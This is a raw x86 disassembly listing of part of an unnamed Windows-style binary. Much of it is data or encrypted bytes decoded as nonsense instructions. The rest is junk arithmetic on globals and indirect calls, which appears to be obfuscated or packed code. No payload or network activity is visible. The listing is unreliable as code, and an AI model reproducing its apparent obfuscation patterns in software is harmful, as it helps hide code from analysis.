  417b34:	xor    BYTE PTR [ebp-0x59],dl
  417b37:	adc    BYTE PTR [ebx],bl
  417b39:	or     eax,0x5c9f2a02
  417b3e:	je     0x417aff
  417b40:	push   ss
  417b41:	dec    ebx
  417b42:	inc    esi
  417b43:	or     cl,BYTE PTR [ebp+0x40]
  417b46:	fisub  WORD PTR [edx]
  417b48:	adc    eax,0x420d98f9
  417b4d:	or     dl,ch
  417b4f:	test   al,0x9f
  417b51:	gs pop eax
  417b53:	retf   
  417b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b55:	jns    0x417bd4
  417b57:	ret    
  417b58:	dec    esp
  417b59:	sbb    DWORD PTR [ebp-0x6cc150ff],0x7d11046f
  417b63:	mov    eax,ds:0x6f15ac1b
  417b68:	out    0x3d,al
  417b6a:	xchg   DWORD PTR [ebp+0x9],edx
  417b6d:	sbb    eax,0x9b08a242
  417b72:	xor    edx,ebp
  417b74:	test   DWORD PTR [edx],esp
  417b76:	or     bl,dl
  417b78:	sbb    DWORD PTR ds:0xac23ba40,eax
  417b7e:	mov    ch,0xcc
  417b80:	adc    DWORD PTR [edx-0x48],ecx
  417b83:	ja     0x417bb2
  417b85:	jmp    0xb090:0x9834e9e4
  417b8c:	pop    edi
  417b8d:	and    ah,ah
  417b8f:	jns    0x417bc2
  417b91:	(bad)  
  417b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b94:	adc    ebx,DWORD PTR [ebx+0x3f451c76]
  417b9a:	outs   dx,BYTE PTR ds:[esi]
  417b9b:	fmul   DWORD PTR [esi+0x45]
  417b9e:	leavew 
  417ba0:	stos   BYTE PTR es:[edi],al
  417ba1:	loop   0x417bf1
  417ba3:	add    BYTE PTR [esi+0x4d],ah
  417ba6:	hlt    
  417ba7:	xchg   edi,eax
  417ba8:	push   ss
  417ba9:	xchg   DWORD PTR [ebp+0x3bb8b46a],esi
  417baf:	pop    esp
  417bb0:	dec    ebx
  417bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bb2:	cmp    DWORD PTR [esi+eiz*2+0x39],0xffffff96
  417bb7:	xor    al,0xd1
  417bb9:	mov    fs,esi
  417bbb:	push   ss
  417bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bbd:	mov    ds:0xc42a6ded,eax
  417bc2:	or     eax,0x910a1686
  417bc7:	or     al,0x81
  417bc9:	jp     0x417bad
  417bcb:	adc    DWORD PTR [eax],esi
  417bcd:	jmp    0xf4e6:0xa871b09a
  417bd4:	nop
  417bd5:	cmc    
  417bd6:	cli    
  417bd7:	xchg   ebx,eax
  417bd8:	ja     0x417c28
  417bda:	in     al,0x2d
  417bdc:	sub    DWORD PTR [ecx-0xa0b915],0x62b524c9
  417be6:	add    eax,0xfe84ce2d
  417beb:	add    al,0x4a
  417bed:	stos   DWORD PTR es:[edi],eax
  417bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bef:	jecxz  0x417c23
  417bf1:	mov    ecx,0x483e558f
  417bf6:	jns    0x417ba0
  417bf8:	mov    al,0xad
  417bfa:	push   0xbabf6f14
  417bff:	xchg   BYTE PTR [ecx-0x1a2f9a2d],ah
  417c05:	lock ret 
  417c07:	push   ds
  417c08:	and    BYTE PTR [ebp+0x7048d690],al
  417c0e:	mov    cl,0x22
  417c10:	test   al,0x49
  417c12:	sbb    al,0x6
  417c14:	retf   
  417c15:	push   0x21162c3c
  417c1a:	sbb    edi,ebp
  417c1c:	jae    0x417bd2
  417c1e:	data16 into 
  417c20:	enter  0x9b0d,0xf3
  417c24:	dec    edi
  417c25:	loopne 0x417bdd
  417c27:	ss cwde 
  417c29:	and    al,0x66
  417c2b:	inc    ecx
  417c2c:	stos   DWORD PTR es:[edi],eax
  417c2d:	sub    eax,0x1e64eb31
  417c32:	and    ah,BYTE PTR es:[eax+0x52c58136]
  417c39:	(bad)  
  417c3a:	mov    ebx,0xb5fd9b96
  417c3f:	loopne 0x417c25
  417c41:	cmp    ah,0x13
  417c44:	sbb    eax,0x34ae0eaf
  417c49:	mov    ebx,0x54e044d7
  417c4e:	sbb    al,0x1f
  417c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c51:	sub    al,0xfb
  417c53:	jl     0x417c98
  417c55:	sub    edi,esi
  417c57:	sti    
  417c58:	add    esi,DWORD PTR [edx]
  417c5a:	mov    ebp,0x71b122d9
  417c5f:	inc    esp
  417c60:	iret   
  417c61:	mov    DWORD PTR [esp+0x1c],esi
  417c65:	add    DWORD PTR ds:0x428435,0x4dd4
  417c6f:	push   eax
  417c70:	and    DWORD PTR ds:0x42857d,0x2c3a
  417c7a:	call   0x40a112
  417c7f:	and    DWORD PTR ds:0x42843d,0x42847d
  417c89:	push   0x4
  417c8b:	push   0x42258c
  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x42844d,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x4284dd,0x0
  417cb2:	mov    DWORD PTR ds:0x428571,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x42844d,0x3679
  417cd7:	cmp    DWORD PTR ds:0x4284dd,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x4284f5
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x42854d
  417d00:	and    DWORD PTR ds:0x42835d,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x42833d
  417d10:	and    DWORD PTR ds:0x42832d,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x428421
  417d1e:	mov    edx,DWORD PTR ds:0x428495
  417d24:	mov    ebx,DWORD PTR ds:0x428511
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x428335,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x4284cd,0x5f12
  417d4c:	mov    DWORD PTR ds:0x428359,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x42844d,edi
  417d61:	cmp    DWORD PTR ds:0x428335,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x428351
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428465,ecx
  417d87:	mov    DWORD PTR ds:0x4284f1,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428569
  417d97:	adc    DWORD PTR ds:0x4284f9,0x890
  417da1:	xor    DWORD PTR ds:0x428365,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x42832d
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417dae
  417ddf:	pusha  
  417de0:	and    BYTE PTR [esi-0x413f1915],bl
  417de6:	xor    eax,0xcfbebec2
  417deb:	jo     0x417e2d
  417ded:	mov    ebx,DWORD PTR [esi+0xefa6232]
  417df3:	push   edi
  417df4:	inc    esi
  417df5:	push   ss
  417df6:	mov    edi,0x76a8f080
  417dfb:	dec    esp
  417dfc:	ficomp WORD PTR [edi+ebx*8]
  417dff:	dec    ecx
  417e00:	inc    ecx
  417e01:	rcr    ecx,1
  417e03:	popf   
  417e04:	jg     0x417d9c
  417e06:	iret   
  417e07:	and    BYTE PTR [eax-0x1],0x1b
  417e0b:	mov    edi,0x4cd5da53
  417e10:	outs   dx,DWORD PTR ds:[esi]
  417e11:	or     DWORD PTR [esi+0x32],edx
  417e14:	out    0xbd,al
  417e16:	div    edx
  417e18:	imul   eax,DWORD PTR [edx-0x60],0x49
  417e1c:	out    dx,al
  417e1d:	enter  0xbdc5,0xe6
  417e21:	mov    dl,0x4d
  417e23:	mov    al,ds:0x3fe3c0a9
  417e28:	add    eax,0xd99aeac3
  417e2d:	sbb    al,0x55
  417e2f:	or     al,0x8
  417e31:	in     eax,0x7b
  417e33:	ss mov dl,0x5f
  417e36:	nop
  417e37:	enter  0x8f1f,0xd0
  417e3b:	scas   eax,DWORD PTR es:[edi]
  417e3c:	cmp    BYTE PTR ds:0x111c5ac8,dl
  417e42:	loopne 0x417df3
  417e44:	xchg   edx,eax
  417e45:	dec    esi
  417e46:	add    DWORD PTR [esp+ebx*4],esp
  417e49:	ins    DWORD PTR es:[edi],dx
  417e4a:	mov    ebp,0x8caa7162
  417e4f:	and    eax,DWORD PTR [ebx]
  417e51:	mov    fs,WORD PTR [ebp+0x27680812]
  417e57:	out    0x9d,al
  417e59:	adc    eax,0xd249168c
  417e5e:	dec    edx
  417e5f:	jl     0x417ebc
  417e61:	clc    
  417e62:	mov    ds:0x3e9a9906,al
  417e67:	adc    DWORD PTR [eax-0x25cd4fae],ecx
  417e6d:	cmp    BYTE PTR [ebx-0x20],bh
  417e70:	leave  
  417e71:	das    
  417e72:	pop    esp
  417e73:	xchg   esp,eax
  417e74:	in     al,0x36
  417e76:	fbld   TBYTE PTR [eax+0x7f2442cf]
  417e7c:	and    eax,0x171af765
  417e81:	dec    eax
  417e82:	push   ds
  417e83:	je     0x417e42
  417e85:	mov    DWORD PTR [ecx-0x6a],eax
  417e88:	jp     0x417eec
  417e8a:	jmp    0xf8c8:0xffce8451
  417e91:	rcl    BYTE PTR [edi+0x63],1
  417e94:	jne    0x417e8a
  417e96:	mov    esp,0xfe71c66b
  417e9b:	ret    0xcc8a
  417e9e:	dec    eax
  417e9f:	into   
  417ea0:	in     al,0xcb
  417ea2:	xor    bl,cl
  417ea4:	inc    DWORD PTR [ebx+0xf]
  417ea7:	push   ds
  417ea8:	push   0x48
  417eaa:	mov    edx,0x84a4d859
  417eaf:	xor    DWORD PTR [ecx+0x5a],eax
  417eb2:	push   ebp
  417eb3:	ins    BYTE PTR es:[edi],dx
  417eb4:	xchg   DWORD PTR [ecx+0x3c1d37f],edx
  417eba:	mov    DWORD PTR [edx+0x68],ecx
  417ebd:	mov    cl,0xd
  417ebf:	mov    ds:0x32cd4004,al
  417ec4:	mov    al,ds:0xfbdc49e7
  417ec9:	jecxz  0x417ed3
  417ecb:	test   BYTE PTR [eax+0x2a],ch
  417ece:	or     esp,DWORD PTR [edx-0x56]
  417ed1:	pop    ds
  417ed2:	xor    edx,DWORD PTR [edx+0x36]
  417ed5:	cmc    
  417ed6:	pusha  
  417ed7:	imul   ebx,DWORD PTR [edx+0x5280c864],0x7d5a4c00
  417ee1:	iret   
  417ee2:	xor    BYTE PTR [edi-0x7db8de89],0xb0
  417ee9:	add    dh,BYTE PTR [esi+0x489a3251]
  417eef:	gs push edi
  417ef1:	cli    
  417ef2:	pop    ss
  417ef3:	and    eax,0xe8d59b7e
  417ef8:	adc    eax,0xcb56ef01
  417efd:	jmp    0x47ce01fd
  417f02:	dec    dx
  417f04:	les    esi,FWORD PTR [ecx-0x1e42b866]
  417f0a:	lods   eax,DWORD PTR ds:[esi]
  417f0b:	popa   
  417f0c:	push   edi
  417f0d:	xchg   al,bh
  417f0f:	push   ds
  417f10:	int3   
  417f11:	pop    ecx
  417f12:	mov    ?,ebp
  417f14:	into   
  417f15:	(bad)  
  417f16:	arpl   WORD PTR ds:0x8509be09,sp
  417f1c:	or     BYTE PTR ds:[edi+0x4a],ch
  417f20:	sub    BYTE PTR [edx+0xe],ah
  417f23:	cmp    DWORD PTR [ebp-0x7188beaa],0xffffffbe
  417f2a:	pusha  
  417f2b:	xchg   edx,eax
  417f2c:	pop    ecx
  417f2d:	xor    ebx,DWORD PTR [edx+0x40]
  417f30:	sbb    eax,0x44f64909
  417f35:	pop    ebp
  417f36:	push   0xffffff96
  417f38:	aam    0x88
  417f3a:	stos   DWORD PTR es:[edi],eax
  417f3b:	pop    ds
  417f3c:	dec    ebp
  417f3d:	inc    ecx
  417f3e:	adc    al,0xc0
  417f40:	ins    DWORD PTR es:[edi],dx
  417f41:	stos   BYTE PTR es:[edi],al
  417f42:	call   0x3001f00b
  417f47:	sub    al,0x9b
  417f49:	jge    0x417f99
  417f4b:	xchg   ecx,eax
  417f4c:	ja     0x417f91
  417f4e:	cmc    
  417f4f:	sbb    ch,dh
  417f51:	les    esp,FWORD PTR [ebx-0x6649f341]
  417f57:	lock fnstenv es:[edi-0x6a438ef5]
  417f5f:	inc    edx
  417f60:	xchg   esp,eax
  417f61:	leave  
  417f62:	xor    esp,ecx
  417f64:	mov    bl,0xcd
  417f66:	daa    
  417f67:	je     0x417ef1
  417f69:	call   0xc9e6:0x27f316e0
  417f70:	cwde   
  417f71:	mov    ebp,0x69ecb976
  417f76:	cmp    dl,BYTE PTR [ebp-0x2d856183]
  417f7c:	and    dh,al
  417f7e:	js     0x417fd5
  417f80:	xchg   BYTE PTR [edx+ebp*8-0x6e],dh
  417f84:	sub    esp,DWORD PTR [ebx+0x38]
  417f87:	mov    ebx,0xe487981
  417f8c:	sub    DWORD PTR [edi-0x64],esp
  417f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f90:	dec    esp
  417f91:	in     eax,dx
  417f92:	stos   DWORD PTR es:[edi],eax
  417f93:	pop    ecx
  417f94:	xchg   ebp,eax
  417f95:	je     0x417fac
  417f97:	fcomp  QWORD PTR [edi-0x23ded15b]
  417f9d:	inc    ebx
  417f9e:	daa    
  417f9f:	pop    ds
  417fa0:	js     0x417ffe
  417fa2:	pop    esi
  417fa3:	call   0x5b1af5b9
  417fa8:	inc    eax
  417fa9:	xchg   esi,eax
  417faa:	stc    
  417fab:	inc    ebp
  417fac:	sar    DWORD PTR [ebx],0xac
  417faf:	popa   
  417fb0:	or     edx,DWORD PTR [edx-0x4f88e6b1]
  417fb6:	sub    BYTE PTR [eax],0xa2
  417fb9:	cld    
  417fba:	mov    DWORD PTR [eax],esp
  417fbc:	repz dec edx
  417fbe:	(bad)  
  417fbf:	cmp    ch,BYTE PTR [eax+0x63ee9ffc]
  417fc5:	push   ebx
  417fc6:	scas   al,BYTE PTR es:[edi]
  417fc7:	xchg   esp,eax
  417fc8:	test   al,0x90
  417fca:	xor    al,cl
  417fcc:	rol    edx,0x13
  417fcf:	into   
  417fd0:	and    BYTE PTR [ebx],bl
  417fd2:	data16 ss mov cl,0xee
  417fd6:	sti    
  417fd7:	dec    esi
  417fd8:	popf   
  417fd9:	fsubp  st(0),st
  417fdb:	hlt    
  417fdc:	stos   BYTE PTR es:[edi],al
  417fdd:	in     al,0x3d
  417fdf:	call   0xc6f8:0xcbb36e8c
  417fe6:	nop
  417fe7:	ins    BYTE PTR es:[edi],dx
  417fe8:	int    0x82
  417fea:	sbb    BYTE PTR [edi+0x1c],dl
  417fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fee:	dec    ebx
  417fef:	rcl    bh,cl
  417ff1:	xor    eax,0xcb02d6ce
  417ff6:	test   DWORD PTR [ebx],edx
  417ff8:	popa   
  417ff9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffb:	push   cs
  417ffc:	sub    eax,0xf1fe31f5
  418001:	dec    esp
  418002:	ss mov edx,0xef639a4f
  418008:	cmp    al,ah
  41800a:	jmp    0xa6df9468
  41800f:	mov    ds:0x89af9817,eax
  418014:	jne    0x417fca
  418016:	inc    ecx
  418017:	mov    ecx,0x9127b235
  41801d:	dec    edi
  41801e:	ja     0x418049
  418020:	inc    edx
  418021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418022:	loope  0x417fde
  418024:	cli    
  418025:	and    eax,0x792a5d9a
  41802a:	lea    eax,[esp+0x98]
  418031:	cmp    DWORD PTR ds:0x42845d,0x0
  418038:	mov    DWORD PTR ds:0x428335,0x1551
  418042:	mov    DWORD PTR ds:0x428545,0x780e
  41804c:	mov    DWORD PTR ds:0x428339,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x428341,edx
  418061:	mov    DWORD PTR ds:0x42833d,0x4140
  41806b:	cmp    DWORD PTR ds:0x42845d,0x0
  418072:	je     0x4180ae
  418078:	push   0x4281f1
  41807d:	push   0x428157
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x428495
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x42853d
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x428405
  4180a1:	adc    DWORD PTR ds:0x428501,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x42844d,edi
  4180ae:	adc    DWORD PTR ds:0x4284d9,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x4283b1
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x428425,ebx
  4180c4:	xor    DWORD PTR ds:0x4284e9,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428465,0x0
  4180d5:	mov    DWORD PTR ds:0x42844d,edx
  4180db:	mov    edx,DWORD PTR ds:0x4284dd
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42857d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428465,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x428411
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428369,ecx
  41810f:	adc    DWORD PTR ds:0x428549,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428475
  418121:	mov    edx,DWORD PTR ds:0x428389
  418127:	mov    ebx,DWORD PTR ds:0x428511
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x428549
  418138:	mov    ebx,DWORD PTR ds:0x4283b9
  41813e:	mov    ecx,DWORD PTR ds:0x4285b9
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x428451,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42857d
  418164:	sub    DWORD PTR ds:0x42845d,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428575,0x0
  418174:	mov    DWORD PTR ds:0x4284dd,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428575,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428475,ebx
  4181b3:	add    DWORD PTR ds:0x428579,0x428441
  4181bd:	mov    ebx,DWORD PTR ds:0x428561
  4181c3:	sbb    ebx,DWORD PTR ds:0x428409
  4181c9:	mov    DWORD PTR ds:0x428561,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x4283ad
  4181d5:	mov    ebx,DWORD PTR ds:0x428529
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x42832d
  4181e6:	and    ebx,DWORD PTR ds:0x428429
  4181ec:	mov    DWORD PTR ds:0x42832d,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x42855d,0x0
  418207:	mov    DWORD PTR ds:0x4284e5,0x564a
  418211:	mov    DWORD PTR ds:0x428465,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x42855d,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x428459
  418252:	adc    DWORD PTR ds:0x42856d,ecx
  418258:	xor    DWORD PTR ds:0x428345,0x4309
  418262:	sub    DWORD PTR ds:0x428375,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	and    BYTE PTR [ecx-0x159b1c58],0xc0
  418284:	mov    esi,0xbebec235
  418289:	add    eax,0x8e926465
  41828e:	xchg   esi,eax
  41828f:	mov    esp,0x45753fdb
  418294:	jb     0x4182f5
  418296:	push   ecx
  418297:	jo     0x41822c
  418299:	push   ebx
  41829a:	xchg   edi,eax
  41829b:	rcl    DWORD PTR [ebx],cl
  41829d:	div    BYTE PTR [ebx+0x55acd880]
  4182a3:	adc    BYTE PTR [esi+0x14d83442],dh
  4182a9:	xor    DWORD PTR [esi+ebx*4],eax
  4182ac:	xchg   ecx,eax
  4182ad:	mov    al,0x99
  4182af:	sbb    eax,0x11047d0c
  4182b4:	pop    ecx
  4182b5:	xchg   edi,eax
  4182b6:	fs dec esp
  4182b8:	cwde   
  4182b9:	mov    DWORD PTR [ebx+0x49],ecx
  4182bc:	call   0x9fb2b3b8
  4182c1:	(bad)  
  4182c3:	addr16 inc edi
  4182c5:	loop   0x41827a
  4182c7:	je     0x4182a6
  4182c9:	push   edx
  4182ca:	cmp    edx,DWORD PTR [eax+0x7f]
  4182cd:	and    edi,edi
  4182cf:	pop    ebx
  4182d0:	ss push eax
  4182d2:	test   BYTE PTR [ebx+0x16fec942],dh
  4182d8:	outs   dx,DWORD PTR ds:[esi]
  4182d9:	add    edi,DWORD PTR [edi-0x64]
  4182dc:	arpl   WORD PTR [esp+ebx*2+0x15],bp
  4182e0:	jmp    0x1b1c7c73
  4182e5:	push   ss
  4182e6:	pop    edx
  4182e7:	mov    ecx,0x308b96ea
  4182ec:	out    0xd5,eax
  4182ee:	or     bl,BYTE PTR [eax+0x5da941e7]
  4182f4:	test   eax,0x9d74658
  4182f9:	icebp  
  4182fa:	popf   
  4182fb:	jmp    0xcf8c:0xda77c049
  418302:	rcl    BYTE PTR [edi-0x5c],0x6
  418306:	pop    es
  418307:	mov    cl,0x82
  418309:	call   0xee6035bc
  41830e:	addr16 daa 
  418310:	cdq    
  418311:	sbb    eax,0x456336f6
  418316:	into   
  418317:	sbb    eax,0x302cec8b
  41831c:	sub    al,0x5c
  41831e:	dec    eax
  41831f:	jl     0x4182e2
  418321:	mov    ds,WORD PTR [edx+edx*4+0x151633ba]
  418328:	mov    ecx,0x99cd5fa8
  41832d:	push   ecx
  41832e:	jecxz  0x4182cf
  418330:	sub    BYTE PTR [ecx-0x5b],ah
  418333:	dec    eax
  418334:	mov    dl,0x8c
  418336:	(bad)  
  418337:	jno    0x4182fb
  418339:	sbb    al,0xd6
  41833b:	mov    dh,0x89
  41833d:	inc    ebp
  41833e:	fwait
  41833f:	test   al,0x23
  418341:	mov    dh,0xe8
  418343:	mov    al,ds:0xa3bccf54
  418348:	xor    ebx,DWORD PTR [eax-0x3e]
  41834b:	inc    edx
  41834c:	sub    cl,0xb2
  41834f:	out    dx,al
  418350:	jmp    0x41833b
  418352:	pop    ebp
  418353:	xchg   edx,eax
  418354:	ret    0xf972
  418357:	fstp   DWORD PTR [eax+ebp*4]
  41835a:	leave  
  41835b:	cld    
  41835c:	cmp    BYTE PTR [ebx-0xd],ch
  41835f:	push   edx
  418360:	mov    ds:0x2d89a796,al
  418365:	adc    al,0xe1
  418367:	lea    esp,[edi]
  418369:	cld    
  41836a:	retf   
  41836b:	cs inc ecx
  41836d:	mov    edi,0xe85ee9b9
  418372:	sete   BYTE PTR [esp+esi*4-0x1b]
  418377:	ins    DWORD PTR es:[edi],dx
  418378:	outs   dx,BYTE PTR ds:[esi]
  418379:	push   ebp
  41837a:	mov    ds:0xbde73,al
  41837f:	sub    al,BYTE PTR [ebx]
  418381:	pusha  
  418382:	xchg   BYTE PTR [esp+eax*1+0x46],dl
  418386:	ffreep st(7)
  418388:	dec    ebx
  418389:	jo     0x41832c
  41838b:	ss dec eax
  41838d:	into   
  41838e:	push   0xd306ca4c
  418393:	fnstcw WORD PTR [ebx+0x4f24b25b]
  418399:	jl     0x41839a
  41839b:	arpl   WORD PTR [eax-0x20],bx
  41839e:	andnps xmm3,XMMWORD PTR [ecx-0x5bd03a5a]
  4183a5:	xor    ebx,0x37c14d8
  4183ab:	inc    esi
  4183ac:	push   ds
  4183ad:	xchg   ebx,eax
  4183ae:	aad    0xbb
  4183b0:	pusha  
  4183b1:	jg     0x4183f0
  4183b3:	test   eax,0x533e8ae7
  4183b8:	stc    
  4183b9:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4183bb:	add    al,0xa8
  4183bd:	inc    ebx
  4183be:	lods   eax,DWORD PTR ds:[esi]
  4183bf:	mov    ss,WORD PTR [edx-0x5fb49a1f]
  4183c5:	inc    edi
  4183c6:	daa    
  4183c7:	pop    ds
  4183c8:	imul   ebp,DWORD PTR [eax],0xffffffdb
  4183cb:	into   
  4183cc:	out    dx,al
  4183cd:	pop    edi
  4183ce:	add    ebp,DWORD PTR [esi-0x7b]
  4183d1:	das    
  4183d2:	push   ebp
  4183d3:	ins    DWORD PTR es:[edi],dx
  4183d4:	inc    ebx
  4183d5:	or     al,BYTE PTR [edi+eax*8-0x1e]
  4183d9:	jo     0x4183ff
  4183db:	cli    
  4183dc:	or     DWORD PTR [edi+edx*1-0x3a],0x96579fdf
  4183e4:	leave  
  4183e5:	iret   
  4183e6:	vpsadbw ymm5,ymm0,YMMWORD PTR [ebx-0x8]
  4183eb:	mov    eax,ecx
  4183ed:	sub    DWORD PTR [eax],0x2566d3a5
  4183f3:	inc    ecx
  4183f4:	ret    0xdc58
  4183f7:	test   al,0xd1
  4183f9:	and    eax,0x900008cc
  4183fe:	dec    ecx
  4183ff:	hlt    
  418400:	mov    esp,esp
  418402:	icebp  
  418403:	lahf   
  418404:	xlat   BYTE PTR ds:[ebx]
  418405:	push   esi
  418406:	je     0x418399
  418408:	sahf   
  418409:	mov    ds:0x9143c332,al
  41840e:	imul   edi,eax,0x51
  418411:	icebp  
  418412:	not    bl
  418414:	dec    edi
  418415:	mov    ebx,0x45c1c7d2
  41841a:	mov    DWORD PTR [ebp+0xe03aa64],ebp
  418420:	push   edx
  418421:	xor    esp,ecx
  418423:	inc    ecx
  418424:	pop    edx
  418425:	stc    
  418426:	and    BYTE PTR [esi+0x19],0x1b
  41842a:	and    al,0xb4
  41842c:	mov    bh,0x5
  41842e:	mov    bh,0x57
  418430:	fst    QWORD PTR [ecx+ebp*1-0x57]
  418434:	lock pusha 
  418436:	pop    edx
  418437:	fst    DWORD PTR [edx]
  418439:	mov    dh,0x83
  41843b:	jb     0x418430
  41843d:	leave  
  41843e:	rol    DWORD PTR [ebx],1
  418440:	xchg   esi,eax
  418441:	adc    eax,0x5177ed6d
  418446:	bound  ebp,QWORD PTR [ebp-0x4daf388]
  41844c:	xor    al,0x38
  41844e:	ss sub al,0xc3
  418451:	mov    al,0xac
  418453:	jge    0x41840a
  418455:	sbb    esp,DWORD PTR [esi-0xcf56674]
  41845b:	push   es
  41845c:	sub    edi,DWORD PTR [ebx-0x10]
  41845f:	shl    DWORD PTR [eax],cl
  418461:	jns    0x4183fc
  418463:	clc    
  418464:	or     ebp,0xcde57078
  41846a:	mov    esi,0x762ccd4b
  41846f:	push   ebx
  418470:	or     edx,DWORD PTR [esi]
  418472:	outs   dx,DWORD PTR ds:[esi]
  418473:	jl     0x418492
  418475:	sbb    BYTE PTR [edx],bl
  418477:	repnz imul ebx,eax,0x984cfcde
  41847e:	test   BYTE PTR [eax+0x3df4ab95],al
  418484:	dec    ebx
  418485:	pop    esi
  418486:	or     al,0xec
  418488:	push   ebp
  418489:	dec    eax
  41848a:	jecxz  0x41848b
  41848c:	lds    ebp,FWORD PTR [edi-0x7c0dc246]
  418492:	mov    ds:0x3fac4bb1,eax
  418497:	mov    dl,0xdd
  418499:	popf   
  41849a:	mov    edi,0x92a4e18d
  41849f:	xchg   esi,esp
  4184a1:	(bad)  
  4184a2:	test   BYTE PTR [edi+0x55],0x8c
  4184a6:	fmul   st(6),st
  4184a8:	mov    eax,ds:0x26866fdb
